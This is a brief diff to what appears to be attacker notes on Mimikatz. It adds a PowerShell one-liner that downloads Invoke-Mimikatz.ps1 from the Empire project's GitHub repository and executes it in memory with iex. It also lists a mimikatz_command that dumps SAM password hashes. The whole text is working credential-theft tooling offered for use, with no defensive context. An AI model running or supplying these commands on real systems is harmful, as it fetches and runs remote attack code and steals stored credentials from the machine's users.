@@ -1,4 +1,7 @@
 
+## Load ##
+iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-MimikatzPS
+
 help mimikaz
 
 mimikatz_command -f samdump::hashes
